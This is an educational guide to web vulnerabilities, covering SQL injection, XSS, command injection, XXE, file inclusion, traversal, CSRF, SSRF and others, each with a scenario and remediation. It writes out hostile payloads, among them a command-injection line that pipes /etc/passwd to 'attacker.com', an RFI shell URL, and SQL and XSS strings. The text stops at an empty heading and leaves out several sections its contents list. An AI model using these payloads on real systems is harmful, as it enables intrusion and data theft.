# Comprehensive Security Vulnerabilities Guide

## Table of Contents

### Authentication & Session Management (7 vulnerabilities)
- #1 SQL Injection
- #2 Weak Passwords
- #3 Plaintext Password Storage
- #4 Predictable Session Tokens
- #22 Missing Function Access Control
- #24 Authentication Bypass
- #28 Broken API Authentication

### Authorization & Access Control (4 vulnerabilities)
- #5 Privilege Escalation
- #8 IDOR (Insecure Direct Object Reference)
- #9 Missing Access Control
- #10 Information Disclosure

### Injection Vulnerabilities (7 vulnerabilities)
- #16 Stored XSS
- #17 DOM-based XSS
- #18 CRLF Injection
- #19 Reflected XSS
- #23 Command Injection
- #30 XXE Injection
- #31 Mass Assignment

### File & Path Vulnerabilities (5 vulnerabilities)
- #25 Directory Traversal
- #26 Local File Inclusion (LFI)
- #27 Remote File Inclusion (RFI)
- #32 Unrestricted File Upload
- #33 Path Traversal in Upload

### Business Logic & Data (6 vulnerabilities)
- #11 CSRF (Cross-Site Request Forgery)
- #12 Buffer Overflow
- #13 Integer Overflow
- #14 SSRF (Server-Side Request Forgery)
- #15 HTTP Parameter Pollution
- #29 Excessive Data Exposure

### Security Misconfigurations (5 vulnerabilities)
- #6 Insufficient Password Policy
- #7 No Email Verification
- #20 Open Redirect
- #21 HTTP Response Splitting
- #34 Arbitrary File Execution

---

## Authentication & Session Management Vulnerabilities

### #1 SQL Injection

**Description:**
SQL Injection occurs when an attacker can insert malicious SQL code into application queries, allowing unauthorized access to database contents, modification of data, or execution of administrative operations.

**Types:**
- **In-band SQLi:** Results are directly visible in the application response
  - Error-based: Uses database error messages to extract information
  - Union-based: Uses UNION SQL operator to combine results
- **Inferential (Blind) SQLi:** No direct data transfer, attacker reconstructs database structure
  - Boolean-based: Sends queries that return different results based on TRUE/FALSE
  - Time-based: Uses database commands to delay response
- **Out-of-band SQLi:** Uses different channels (DNS, HTTP requests) to retrieve data

**Real-World Scenario:**
Sarah, a cybersecurity researcher, was testing an e-commerce website's login system. She noticed that when she entered a single quote in the username field, the site returned a database error message. This revealed that user input was being directly inserted into SQL queries without proper sanitization.

**How the Attack Unfolds:**
1. Sarah enters `admin' OR '1'='1` as the username and leaves the password blank
2. The website's database query becomes corrupted, treating her input as SQL code rather than data
3. The malicious condition `'1'='1'` is always true, causing the system to authenticate her without a valid password
4. She gains access to the admin account and discovers she can view all customer data
5. In a more destructive scenario, an attacker could use `admin'; DROP TABLE users; --` to completely delete the user database

**Remediation:**
- Use parameterized queries/prepared statements
- Implement input validation and sanitization
- Use ORM frameworks that handle SQL safely
- Apply principle of least privilege to database accounts
- Use stored procedures
- Implement WAF (Web Application Firewall)

---

### #2 Weak Passwords

**Description:**
Weak passwords are easily guessable or crackable passwords that don't meet security standards, making accounts vulnerable to brute force and dictionary attacks.

**Types:**
- Dictionary words (e.g., "password", "admin")
- Common patterns (e.g., "123456", "qwerty")
- Personal information (names, birthdays)
- Short passwords (less than 8 characters)
- Single character type (only lowercase, only numbers)

**Real-World Scenario:**
TechCorp, a mid-sized software company, allowed employees to set simple passwords like "password123" or "company2023" for their corporate accounts. When a disgruntled former employee wanted to access confidential project files, he didn't need sophisticated hacking tools.

**How the Attack Unfolds:**
1. The attacker downloads a list of the 10,000 most common passwords from the internet
2. Using automated tools, he systematically tries these passwords against employee email addresses he found on LinkedIn
3. Within hours, he successfully logs into 15 employee accounts using passwords like "welcome1", "admin", and "TechCorp2023"
4. He accesses sensitive customer data, financial reports, and upcoming product plans
5. The breach goes undetected for weeks because the logins appear to come from legitimate employee accounts

**Remediation:**
- Enforce minimum password length (12+ characters)
- Require complexity (uppercase, lowercase, numbers, special characters)
- Implement password strength meters
- Check against common password lists
- Use multi-factor authentication (MFA)
- Implement account lockout after failed attempts
- Educate users on password best practices

---

### #3 Plaintext Password Storage

**Description:**
Storing passwords in plaintext or using weak/reversible encryption makes all user accounts vulnerable if the database is compromised.

**Types:**
- Plaintext storage in database
- Reversible encryption (Base64, simple XOR)
- Weak hashing (MD5, SHA1 without salt)
- Inadequate hashing (no salt, weak algorithms)

**Real-World Scenario:**
MegaRetail, a popular online shopping platform, stored customer passwords in plain text in their database to make customer service easier - representatives could see actual passwords when helping customers with login issues. When a security researcher discovered an SQL injection vulnerability in their search function, the consequences were catastrophic.

**How the Attack Unfolds:**
1. The researcher exploits the SQL injection to download the entire customer database
2. Inside, he finds 2.3 million customer passwords stored in readable text: "Admin123!", "mypassword", "ilovecats", etc.
3. He responsibly reports this to MegaRetail, but warns that malicious attackers could have done the same
4. Criminals could use these exact passwords to break into customers' email accounts, banking sites, and social media
5. Even after MegaRetail fixes the issue, customers remain vulnerable on other sites where they used the same passwords

**Remediation:**
- Use strong hashing algorithms (bcrypt, Argon2, PBKDF2)
- Implement unique salts for each password
- Use sufficient work factor/iterations
- Never store plaintext passwords
- Implement pepper (application-level secret)
- Regular security audits of password storage
- Force password reset if breach detected

---

### #4 Predictable Session Tokens

**Description:**
Session tokens that follow predictable patterns or use weak randomness can be guessed or calculated by attackers, allowing session hijacking.

**Types:**
- Sequential tokens (session1, session2, session3)
- Timestamp-based tokens
- Weak random number generation
- Short token length
- Tokens based on user information

**Real-World Scenario:**
BankSecure's online banking system generated session tokens by combining the customer's account number with the current timestamp. Customer John Smith (account #12345) logs in at 2:00 PM and receives session token "12345_1638360000". A cybercriminal named Alex notices this pattern after creating his own account.

**How the Attack Unfolds:**
1. Alex creates a test account and logs in multiple times, studying the session tokens he receives
2. He realizes the pattern: account number + timestamp, making tokens completely predictable
3. Alex writes a simple script that generates valid session tokens for any account number at any time
4. He targets high-value accounts (like account #1, #100, #1000) and generates recent session tokens
5. Using these predicted tokens, Alex successfully hijacks active banking sessions and transfers money to his accounts
6. Victims don't realize they've been compromised until they check their account balances days later

**Remediation:**
- Use cryptographically secure random number generators
- Generate tokens with sufficient entropy (128+ bits)
- Implement token expiration
- Regenerate tokens after authentication
- Use secure session management frameworks
- Implement token binding to user attributes
- Monitor for suspicious session activity

---

### #22 Missing Function Access Control

**Description:**
Functions or API endpoints that don't verify user permissions before execution, allowing unauthorized users to perform privileged operations.

**Types:**
- Unprotected admin functions
- Missing role checks
- Client-side only access control
- Inconsistent authorization checks

**Real-World Scenario:**
SocialConnect, a popular social media platform, had an admin function to delete user accounts that was supposed to be restricted to moderators only. However, the developers forgot to add proper permission checks to this function. Regular user Emma discovered this while exploring the platform's features.

**How the Attack Unfolds:**
1. Emma notices that moderator actions follow a predictable URL pattern: /admin/delete_user/[user_id]
2. Out of curiosity, she tries accessing this URL directly while logged in as a regular user
3. To her surprise, the system allows her to delete any user account without checking if she has admin privileges
4. Emma realizes she can delete celebrity accounts, competitor profiles, or even the CEO's account
5. She could also discover other admin functions like /admin/view_private_messages/ or /admin/ban_user/
6. A malicious user could systematically delete thousands of accounts, causing massive platform disruption

**Remediation:**
- Implement authorization checks on all functions
- Use role-based access control (RBAC)
- Verify permissions server-side
- Apply principle of least privilege
- Use middleware/decorators for consistent checks
- Implement proper API gateway security
- Regular security testing and code reviews

---

### #24 Authentication Bypass

**Description:**
Vulnerabilities that allow attackers to circumvent authentication mechanisms and gain unauthorized access without valid credentials.

**Types:**
- Logic flaws in authentication code
- SQL injection in login forms
- Cookie manipulation
- Session fixation
- Authentication token manipulation
- Default credentials
- Broken authentication workflows

**Real-World Scenario:**
CloudStorage Inc. implemented a new authentication system where they intended to carefully verify admin credentials, but accidentally created a logic flaw. The system was supposed to check admin passwords strictly, but for non-admin users, it would skip password verification entirely. Hacker Maria discovered this during a penetration test.

**How the Attack Unfolds:**
1. Maria attempts to log in with username "testuser" and a random password "wrongpassword123"
2. Surprisingly, the system logs her in successfully because the flawed code assumes any non-admin login is valid
3. She realizes she can access any regular user account by simply knowing their username
4. Maria escalates by trying usernames like "ceo", "manager", "developer" with any password
5. She gains access to executive accounts containing sensitive business plans and customer data
6. The company doesn't detect the breach because the logins appear legitimate in their logs

**Remediation:**
- Implement secure authentication frameworks
- Use multi-factor authentication
- Proper input validation and sanitization
- Secure session management
- Remove default credentials
- Implement rate limiting
- Regular security code reviews
- Use security testing tools

---

### #28 Broken API Authentication

**Description:**
APIs that lack proper authentication mechanisms or implement them incorrectly, allowing unauthorized access to API endpoints and data.

**Types:**
- Missing authentication headers
- Weak API key implementation
- Exposed API keys in client code
- No token expiration
- Insecure token storage
- Missing rate limiting

**Real-World Scenario:**
HealthTracker, a fitness app company, built an API to share user data with partner applications. While their main app required login, they forgot to add authentication to their API endpoints. Security researcher David discovered this while analyzing the app's network traffic.

**How the Attack Unfolds:**
1. David uses network monitoring tools to see what URLs the HealthTracker app contacts
2. He discovers an API endpoint: api.healthtracker.com/users that returns user data
3. Testing this URL in his browser, David finds it returns detailed information about all 500,000 users
4. The data includes names, email addresses, workout routines, health conditions, and GPS locations
5. David realizes anyone on the internet can access this sensitive health data without any credentials
6. Malicious actors could use this information for identity theft, insurance fraud, or stalking users based on their workout locations

**Remediation:**
- Implement OAuth 2.0 or JWT authentication
- Use API gateways with authentication
- Rotate API keys regularly
- Implement token expiration and refresh
- Never expose keys in client code
- Use HTTPS for all API communications
- Implement rate limiting and throttling
- Monitor API usage for anomalies

---

## Authorization & Access Control Vulnerabilities

### #5 Privilege Escalation

**Description:**
Attackers gain higher-level permissions than intended, allowing them to perform administrative actions or access restricted resources.

**Types:**
- Vertical privilege escalation (user to admin)
- Horizontal privilege escalation (user to another user)
- Parameter manipulation
- Role manipulation
- Exploiting missing authorization checks

**Real-World Scenario:**
OnlineUniversity's learning management system stored student privileges in browser cookies to make the interface load faster. Student Jake noticed that his browser stored a cookie labeled "role=student" when he logged into the system. Curious about what would happen, he decided to experiment.

**How the Attack Unfolds:**
1. Jake opens his browser's developer tools and finds the cookie that says "role=student"
2. He changes it to "role=professor" and refreshes the page
3. Suddenly, Jake has access to grade all students, view exam answers, and modify course content
4. He changes the cookie to "role=admin" and gains access to the entire university's academic records
5. Jake can now view transcripts, change grades, access financial aid information, and even create new student accounts
6. The system never verifies his actual permissions on the server - it trusts whatever the cookie says

**Remediation:**
- Store roles server-side only
- Implement proper authorization checks
- Use role-based access control (RBAC)
- Validate permissions on every request
- Implement principle of least privilege
- Regular security audits
- Use secure session management

---

### #8 IDOR (Insecure Direct Object Reference)

**Description:**
Application exposes references to internal objects (files, database records) without proper authorization, allowing attackers to access other users' data.

**Types:**
- Sequential ID manipulation
- GUID/UUID exposure
- File path manipulation
- Database key exposure

**Real-World Scenario:**
MedicalPortal allows patients to view their lab results online using URLs like "medicalportal.com/results?patient_id=1247". Patient Lisa notices this number in her browser's address bar after logging in to check her blood test results. She wonders what would happen if she changed the number.

**How the Attack Unfolds:**
1. Lisa changes her patient ID from 1247 to 1248 in the URL and presses enter
2. She's shocked to see another patient's complete medical history, including HIV test results and mental health records
3. Curious, Lisa tries patient IDs 1249, 1250, and 1251 - each reveals different patients' confidential medical information
4. She realizes she can access thousands of patient records by simply changing the number in the URL
5. Lisa could view celebrities' medical records (if they use this portal), discover neighbors' health conditions, or sell medical information to insurance companies
6. The hospital has no idea this is happening because Lisa is using her legitimate login credentials

**Remediation:**
- Implement proper authorization checks
- Use indirect references (mapping tables)
- Validate user ownership of objects
- Use UUIDs instead of sequential IDs
- Implement access control lists (ACLs)
- Never expose internal object references
- Log and monitor access attempts

---

### #9 Missing Access Control

**Description:**
Resources or functions lack proper access control checks, allowing any authenticated (or unauthenticated) user to access them.

**Types:**
- Missing authentication checks
- Missing authorization checks
- Unprotected API endpoints
- Exposed admin interfaces
- Client-side only restrictions

**Real-World Scenario:**
RetailChain's employee portal had a hidden admin section that was supposed to be accessible only to managers. However, the developers only hid the link from regular employees' dashboards but didn't actually restrict access to the admin pages themselves. Employee Mike discovered this by accident.

**How the Attack Unfolds:**
1. Mike is browsing the employee portal when he accidentally types "retailchain.com/admin.html" instead of his usual page
2. Instead of getting an error, he's taken to a powerful admin dashboard he's never seen before
3. The admin panel allows him to view all employee salaries, change work schedules, access security camera feeds, and modify inventory systems
4. Mike realizes he can give himself raises, see confidential HR reports, and even access the CEO's calendar and emails
5. He could also discover other hidden pages like /payroll.html, /hr-reports.html, or /financial-data.html
6. Any employee who stumbles upon these URLs gains complete administrative control over company operations

**Remediation:**
- Implement authentication and authorization on all resources
- Use middleware for consistent access control
- Server-side validation for all requests
- Implement default-deny access control
- Regular security testing
- Use security frameworks with built-in access control
- Proper error handling (don't reveal existence of resources)

---

### #10 Information Disclosure

**Description:**
Application reveals sensitive information that should be kept confidential, such as system details, user data, or internal application structure.

**Types:**
- Verbose error messages
- Directory listings
- Source code exposure
- Configuration file exposure
- Debug information in production
- Sensitive data in responses
- Comments in HTML/JavaScript

**Real-World Scenario:**
ShopFast's e-commerce website was having technical issues, and when customer Jennifer tried to update her profile, she received a detailed error message instead of a simple "Something went wrong" notice. The error revealed far more than the developers intended.

**How the Attack Unfolds:**
1. Jennifer sees an error message: "Error: Column 'credit_card_number' not found in table 'users' - Database: MySQL 5.7.32 on server db.internal.shopfast.com"
2. This tells her that customer credit card numbers are stored in the main user database (a security risk)
3. She learns the exact database version (MySQL 5.7.32) which she can research for known vulnerabilities
4. The internal server name "db.internal.shopfast.com" reveals their network structure
5. Jennifer shares this information on security forums, where hackers use it to plan targeted attacks
6. Attackers now know exactly what database system to exploit and that valuable credit card data is stored in an easily accessible location

**Remediation:**
- Implement generic error messages
- Disable directory listings
- Remove debug information in production
- Secure configuration files
- Remove comments from production code
- Implement proper error handling
- Use security headers
- Regular security scans
- Minimize data in API responses

---

## Injection Vulnerabilities

### #16 Stored XSS (Cross-Site Scripting)

**Description:**
Malicious scripts are permanently stored on the target server (database, file system) and executed when other users view the infected page.

**Types:**
- Database-stored XSS
- File-based XSS
- Comment/forum XSS
- Profile field XSS

**Real-World Scenario:**
TechForum, a popular programming discussion site, allows users to post comments and code snippets. Malicious user "CyberTroll" discovers that the comment system doesn't filter out dangerous code. He decides to exploit this to steal other users' login sessions.

**How the Attack Unfolds:**
1. CyberTroll posts what appears to be a helpful comment about JavaScript, but hidden within is malicious code
2. The forum's database stores his comment exactly as written, including the hidden malicious script
3. When other users view the discussion thread, CyberTroll's script automatically runs in their browsers
4. The script secretly sends their login cookies to CyberTroll's server, giving him access to their accounts
5. Popular threads with his comments are viewed by hundreds of users, compromising dozens of accounts
6. CyberTroll uses these hijacked accounts to post spam, access private messages, and damage users' reputations

**Remediation:**
- Input validation and sanitization
- Output encoding (HTML entity encoding)
- Use Content Security Policy (CSP)
- Implement HTTPOnly cookies
- Use security libraries for XSS prevention
- Regular security testing
- Validate data types and formats
- Use templating engines with auto-escaping

---

### #17 DOM-based XSS

**Description:**
Vulnerability exists in client-side JavaScript code that processes user input and updates the DOM without proper sanitization.

**Types:**
- URL fragment manipulation
- JavaScript execution via DOM manipulation
- Client-side template injection
- Unsafe JavaScript functions (eval, innerHTML)

**Real-World Scenario:**
WelcomeApp, a corporate intranet portal, personalizes the homepage by displaying "Hello [Name]" using the employee's name from the URL. The JavaScript code takes whatever appears after the # symbol and displays it directly on the page. Attacker Rachel crafts a malicious link to exploit this.

**How the Attack Unfolds:**
1. Rachel creates a malicious URL: "welcomeapp.com/#<img src=x onerror=alert('Stealing your data!')>"
2. She emails this link to employees, claiming it's a "new personalized dashboard feature"
3. When employees click the link, instead of seeing "Hello Rachel", they see a popup, and malicious code runs
4. The code could steal their corporate login cookies, access confidential documents, or install keyloggers
5. Since the malicious code runs on the legitimate corporate domain, it bypasses many security filters
6. Rachel could modify the attack to silently steal employee credentials or company secrets without any visible signs

**Remediation:**
- Use safe DOM manipulation methods (textContent instead of innerHTML)
- Validate and sanitize all user inputs
- Avoid using eval() and similar functions
- Implement Content Security Policy
- Use security-focused JavaScript frameworks
- Regular code reviews
- Use DOM sanitization libraries
- Encode output properly

---

### #18 CRLF Injection

**Description:**
Attacker injects Carriage Return (CR) and Line Feed (LF) characters into application input, allowing manipulation of HTTP headers or log files.

**Types:**
- HTTP Response Splitting
- Log injection
- Header injection
- Email header injection

**Real-World Scenario:**
CookieShop's website sets a personalized cookie with the customer's name to remember their preferences. The system takes whatever name the customer enters and puts it directly into the cookie header. Hacker Tom realizes he can manipulate this to inject additional cookies and headers.

**How the Attack Unfolds:**
1. Tom enters his name as "Tom" followed by special characters that create a new line in the HTTP response
2. After the line break, he adds "Set-Cookie: admin=true" to give himself administrator privileges
3. When the server processes his registration, it unknowingly creates two cookies: one with his name and another marking him as an admin
4. Tom now has administrative access to view all customer orders, payment information, and can modify the website
5. He could also inject headers that redirect other customers to phishing sites or steal their personal information
6. The attack is invisible to other users and doesn't appear in normal security logs

**Remediation:**
- Validate and sanitize all user inputs
- Remove or encode CRLF characters
- Use framework functions for header setting
- Implement input validation
- Use security libraries
- Regular security testing
- Proper logging mechanisms

---

### #19 Reflected XSS

**Description:**
Malicious script is reflected off a web server in the response, typically via URL parameters or form inputs, and executed immediately in the victim's browser.

**Types:**
- URL parameter XSS
- Form input XSS
- Search field XSS
- Error message XSS

**Real-World Scenario:**
BookStore's website has a search feature that shows "You searched for: [search term]" at the top of results. The site displays exactly what users type without checking if it contains dangerous code. Scammer Lisa uses this to create convincing phishing attacks.

**How the Attack Unfolds:**
1. Lisa crafts a malicious search URL that contains hidden JavaScript code instead of book titles
2. She sends emails to BookStore customers saying "Check out this amazing book deal!" with her malicious link
3. When customers click the link, they see the BookStore website (which looks legitimate) but Lisa's code runs secretly
4. The code creates a fake "Your session expired, please re-enter your password" popup
5. Customers enter their passwords, which are sent directly to Lisa's server
6. Lisa now has access to customer accounts and can make purchases using their stored credit cards

**Remediation:**
- Input validation and sanitization
- Output encoding (HTML entity encoding)
- Content Security Policy (CSP)
- HTTPOnly and Secure cookie flags
- Use security frameworks
- Validate data types
- Implement WAF
- User education about suspicious links

---

### #23 Command Injection

**Description:**
Attacker executes arbitrary system commands on the server by injecting malicious input into application functions that execute shell commands.

**Types:**
- OS command injection
- Shell injection
- Blind command injection
- Time-based command injection

**Real-World Scenario:**
FileConverter, a web service that converts documents between formats, allows users to specify which file they want to convert. Behind the scenes, the system runs command-line tools to process files. The developers didn't realize that user input was being passed directly to system commands. Attacker Kevin discovers this during testing.

**How the Attack Unfolds:**
1. Kevin uploads a document and notices the filename parameter in the conversion request
2. Instead of a normal filename like "document.pdf", he enters "document.pdf; ls -la /"
3. The system runs the file conversion command, but also executes Kevin's additional command to list all server files
4. Kevin sees the server's directory structure and realizes he can run any command he wants
5. He escalates by running "document.pdf; curl attacker.com?data=$(cat /etc/passwd)" to steal the server's user database
6. Kevin could delete all files, install backdoors, steal customer documents, or use the server to attack other systems

**Remediation:**
- Avoid executing system commands with user input
- Use language-specific APIs instead of shell commands
- Input validation with whitelist approach
- Escape special characters
- Use parameterized commands
- Implement principle of least privilege
- Run applications with minimal permissions
- Use sandboxing and containerization

---

### #30 XXE (XML External Entity) Injection

**Description:**
Attacker exploits vulnerable XML parsers to access local files, perform SSRF attacks, or cause denial of service by injecting malicious XML external entities.

**Types:**
- File disclosure XXE
- SSRF via XXE
- Denial of Service XXE
- Blind XXE (out-of-band)

**Example Scenario:**
Application parses XML without disabling external entities:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

**How to Exploit:**
1. Submit XML with malicious external entity
2. Read local files: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
3. Perform SSRF: `<!ENTITY xxe SYSTEM "http://internal-server/">`
4. Denial of Service: Billion laughs attack
5. Out-of-band data exfiltration
6. Port scanning internal network

**Remediation:**
- Disable external entity processing in XML parsers
- Use less complex data formats (JSON)
- Input validation
- Update XML libraries
- Implement whitelist for XML schemas
- Use secure XML parser configurations
- Patch and update dependencies
- Network segmentation

---

### #31 Mass Assignment

**Description:**
Application automatically binds user input to internal objects without filtering, allowing attackers to modify object properties they shouldn't have access to.

**Types:**
- Parameter binding vulnerabilities
- Object property injection
- Privilege escalation via mass assignment
- Data manipulation

**Example Scenario:**
User registration that binds all parameters:
```python
user = User(**request.form)  # Binds all form data
user.save()
```
Attacker adds: `is_admin=true` to the form data

**How to Exploit:**
1. Identify object properties through error messages or documentation
2. Add additional parameters to requests
3. Modify sensitive fields (role, permissions, prices)
4. Escalate privileges by setting admin flags
5. Bypass payment by modifying price fields
6. Manipulate account balances

**Remediation:**
- Use whitelist approach for allowed parameters
- Explicitly define bindable attributes
- Implement proper authorization checks
- Use DTOs (Data Transfer Objects)
- Validate all input parameters
- Separate internal and external models
- Regular code reviews
- Use framework security features

---

## File & Path Vulnerabilities

### #25 Directory Traversal

**Description:**
Attacker manipulates file path parameters to access files and directories outside the intended directory, potentially accessing sensitive system files.

**Types:**
- Path traversal using ../
- Absolute path manipulation
- URL encoding bypass
- Double encoding bypass

**Example Scenario:**
Application serves files based on user input:
```python
filename = request.args.get('file')
with open('/var/www/files/' + filename) as f:
    return f.read()
```
Attacker input: `../../../../etc/passwd`

**How to Exploit:**
1. Use ../ sequences to traverse directories
2. Access sensitive files: `../../../../etc/passwd`
3. Try different encoding: `..%2F..%2F..%2Fetc%2Fpasswd`
4. Double encoding: `..%252F..%252F`
5. Null byte injection: `../../../../etc/passwd%00.jpg`
6. Access configuration files, source code, credentials

**Remediation:**
- Validate and sanitize file paths
- Use whitelist of allowed files
- Implement proper access controls
- Use absolute paths and validate against base directory
- Avoid user input in file operations
- Use chroot jails or sandboxing
- Remove ../ sequences
- Implement proper error handling

---

### #26 Local File Inclusion (LFI)

**Description:**
Attacker includes local files from the server through vulnerable include/require functions, potentially executing code or accessing sensitive information.

**Types:**
- Basic LFI
- LFI with code execution
- LFI via log poisoning
- LFI with null byte injection

**Example Scenario:**
PHP application with dynamic includes:
```php
<?php
$page = $_GET['page'];
include($page . '.php');
?>
```
Attacker input: `../../../../etc/passwd%00`

**How to Exploit:**
1. Manipulate file inclusion parameters
2. Include sensitive files: `/etc/passwd`, configuration files
3. Log poisoning: inject PHP code into logs, then include log file
4. Include uploaded files with malicious code
5. Use null byte to bypass extensions
6. Chain with other vulnerabilities for code execution
7. Access source code and credentials

**Remediation:**
- Avoid dynamic file inclusion based on user input
- Use whitelist of allowed files
- Implement proper input validation
- Use mapping/routing instead of direct inclusion
- Disable dangerous PHP functions
- Proper file permissions
- Regular security audits
- Use framework routing mechanisms

---

### #27 Remote File Inclusion (RFI)

**Description:**
Attacker includes remote files from external servers, typically leading to remote code execution by including malicious scripts.

**Types:**
- Direct RFI
- RFI with code execution
- RFI via URL wrappers
- Data URI RFI

**Example Scenario:**
PHP application allowing remote includes:
```php
<?php
$module = $_GET['module'];
include($module);
?>
```
Attacker input: `http://attacker.com/shell.php`

**How to Exploit:**
1. Host malicious file on attacker-controlled server
2. Include remote file via vulnerable parameter
3. Execute arbitrary code on target server
4. Establish backdoor or web shell
5. Use data:// or php:// wrappers
6. Bypass filters with encoding
7. Complete server compromise

**Remediation:**
- Disable allow_url_include in PHP
- Disable allow_url_fopen if not needed
- Never use user input in include/require
- Implement strict input validation
- Use whitelist approach
- Disable dangerous PHP wrappers
- Regular security updates
- Network-level filtering

---

### #32 Unrestricted File Upload

**Description:**
Application allows users to upload files without proper validation, enabling attackers to upload malicious files that can be executed on the server.

**Types:**
- Executable file upload (PHP, JSP, ASP)
- Malicious file content
- File type bypass
- Double extension bypass
- MIME type manipulation

**Real-World Scenario:**
PhotoShare, a social media platform for sharing images, allows users to upload profile pictures and photo albums. The system was designed to accept image files, but the developers didn't properly verify what users were actually uploading. Attacker Ryan discovers he can upload dangerous files disguised as innocent photos.

**How the Attack Unfolds:**
1. Ryan creates a malicious PHP script that gives him remote control of web servers
2. He renames the file from "backdoor.php" to "vacation-photo.php" to make it look like an image
3. PhotoShare accepts the upload and stores it in the web-accessible uploads folder
4. Ryan visits the direct URL of his "photo" (photoshare.com/uploads/vacation-photo.php)
5. Instead of displaying an image, the server executes Ryan's malicious code, giving him complete control
6. Ryan can now access all user photos, private messages, delete accounts, steal personal information, or use PhotoShare's servers to attack other websites

**Remediation:**
- Validate file types (whitelist approach)
- Check file content, not just extension
- Rename uploaded files
- Store uploads outside web root
- Implement file size limits
- Scan files for malware
- Use separate domain for user content
- Disable script execution in upload directories
- Implement proper access controls

---

### #33 Path Traversal in Upload

**Description:**
Attacker manipulates file upload paths to write files to arbitrary locations on the server, potentially overwriting critical files or placing malicious files in executable directories.

**Types:**
- Directory traversal in filename
- Absolute path manipulation
- Symbolic link attacks
- Zip slip vulnerability

**Example Scenario:**
Upload function using user-provided filename:
```python
filename = request.files['file'].filename
file.save('/uploads/' + filename)
```
Attacker filename: `../../../../var/www/html/shell.php`

**How to Exploit:**
1. Use ../ in filename to traverse directories
2. Upload to web-accessible directories
3. Overwrite configuration files
4. Place web shells in executable locations
5. Zip slip: malicious archive with traversal paths
6. Overwrite .htaccess or web.config
7. Replace legitimate application files

**Remediation:**
- Sanitize and validate filenames
- Remove path traversal sequences
- Generate random filenames
- Use basename() to extract filename only
- Validate against whitelist of characters
- Store files outside web root
- Implement proper access controls
- Use secure file handling libraries
- Validate archive contents before extraction

---

## Business Logic & Data Vulnerabilities

### #11 CSRF (Cross-Site Request Forgery)

**Description:**
Attacker tricks authenticated users into executing unwanted actions on a web application where they're authenticated, exploiting the trust the application has in the user's browser.

**Types:**
- GET-based CSRF
- POST-based CSRF
- JSON CSRF
- Login CSRF

**Real-World Scenario:**
SecureBank's online banking system allows customers to transfer money using simple web forms. However, the bank doesn't verify that transfer requests actually come from their own website. Cybercriminal Marcus exploits this to steal money from bank customers without ever accessing their accounts directly.

**How the Attack Unfolds:**
1. Marcus creates a fake website called "Win-Free-Money.com" with an enticing "Click here to claim your prize!" button
2. Hidden behind this button is code that automatically submits a money transfer form to SecureBank
3. When bank customer Sarah visits Marcus's site while logged into her banking account, clicking the prize button secretly transfers $10,000 to Marcus's account
4. Sarah's browser automatically includes her banking cookies, making the transfer appear legitimate
5. Sarah doesn't realize money was stolen until she checks her account balance days later
6. Marcus scales this attack by buying ads for his fake prize website, stealing from hundreds of victims

**Remediation:**
- Implement CSRF tokens (synchronizer token pattern)
- Use SameSite cookie attribute
- Verify Origin and Referer headers
- Require re-authentication for sensitive actions
- Use custom headers for AJAX requests
- Implement double-submit cookie pattern
- User interaction for critical operations
- Short session timeouts

---

### #12 Buffer Overflow

**Description:**
Program writes more data to a buffer than it can hold, potentially overwriting adjacent memory and allowing code execution or crashes.

**Types:**
- Stack-based buffer overflow
- Heap-based buffer overflow
- Integer overflow leading to buffer overflow
- Format string vulnerabilities

**Real-World Scenario:**
LegacyServer runs critical infrastructure software written in C that processes network requests. The software was designed to handle usernames up to 10 characters long, but the programmers didn't add proper length checking. When security researcher Dr. Chen tests the system, she discovers she can crash or control the server by sending oversized data.

**How the Attack Unfolds:**
1. Dr. Chen sends a username that's 50 characters long instead of the expected 10
2. The extra 40 characters overflow into adjacent memory, corrupting critical system data
3. She carefully crafts the overflow data to overwrite the program's return address
4. When the function tries to return, instead of going back to normal code, it jumps to Dr. Chen's malicious code
5. Her code now runs with the same privileges as the server software, giving her complete system control
6. She could shut down critical infrastructure, steal sensitive data, or use the server to launch attacks on other systems

**Remediation:**
- Use safe functions (strncpy, snprintf)
- Implement bounds checking
- Use memory-safe languages
- Enable compiler protections (ASLR, DEP, stack canaries)
- Input validation and length checks
- Use modern development frameworks
- Regular security testing
- Code reviews and static analysis

---

### #13 Integer Overflow

**Description:**
Arithmetic operation results in a value too large for the integer type, wrapping around to a small or negative value, potentially causing security issues.

**Types:**
- Signed integer overflow
- Unsigned integer overflow
- Integer underflow
- Width overflow

**Example Scenario:**
Price calculation with integer overflow:
```c
unsigned int price = 100;
unsigned int quantity = user_input;  // 4294967295
unsigned int total = price * quantity;  // Overflows to small value
```

**How to Exploit:**
1. Identify arithmetic operations on user input
2. Provide values that cause overflow
3. Bypass payment systems (overflow to $0)
4. Cause buffer overflows via size calculations
5. Bypass authentication checks
6. Manipulate resource allocations
7. Cause denial of service

**Remediation:**
- Use safe arithmetic libraries
- Validate input ranges
- Check for overflow before operations
- Use larger integer types
- Implement proper error handling
- Use languages with overflow protection
- Static code analysis
- Thorough testing with boundary values

---

### #14 SSRF (Server-Side Request Forgery)

**Description:**
Attacker tricks the server into making HTTP requests to arbitrary destinations, potentially accessing internal resources or performing actions on behalf of the server.

**Types:**
- Basic SSRF
- Blind SSRF
- SSRF via URL parameters
- SSRF via file upload (XXE, SVG)
- DNS rebinding SSRF

**Real-World Scenario:**
WebProxy, a service that fetches and displays web pages for users, allows customers to enter any URL to view websites through their servers. This feature was designed to help users bypass geographic restrictions, but the developers didn't consider that attackers could use it to access internal company systems. Hacker Nina discovers this during reconnaissance.

**How the Attack Unfolds:**
1. Nina enters "http://localhost:8080/admin" instead of a normal website URL
2. WebProxy's server makes the request to its own internal admin panel and displays the results to Nina
3. She now has access to internal company systems that should be completely hidden from the internet
4. Nina tries "http://169.254.169.254/latest/meta-data/" and gains access to cloud server credentials and configuration
5. She uses the proxy to scan internal networks, finding databases, email servers, and development systems
6. Nina accesses confidential customer data, source code, and financial information without ever directly attacking the company's firewalls

**Remediation:**
- Validate and sanitize URLs
- Use whitelist of allowed domains/IPs
- Block access to private IP ranges
- Disable unnecessary URL schemes (file://, gopher://)
- Implement network segmentation
- Use separate network for external requests
- Monitor outbound traffic
- Implement timeout and size limits

---

### #15 HTTP Parameter Pollution

**Description:**
Attacker sends multiple HTTP parameters with the same name, exploiting inconsistent parameter parsing between different components to bypass security controls.

**Types:**
- Query string pollution
- POST parameter pollution
- Cookie pollution
- Header pollution

**Example Scenario:**
Application uses first parameter, WAF checks last:
```
URL: /transfer?amount=1&amount=10000
Application reads: amount=1 (passes WAF)
Backend processes: amount=10000 (actual transfer)
```

**How to Exploit:**
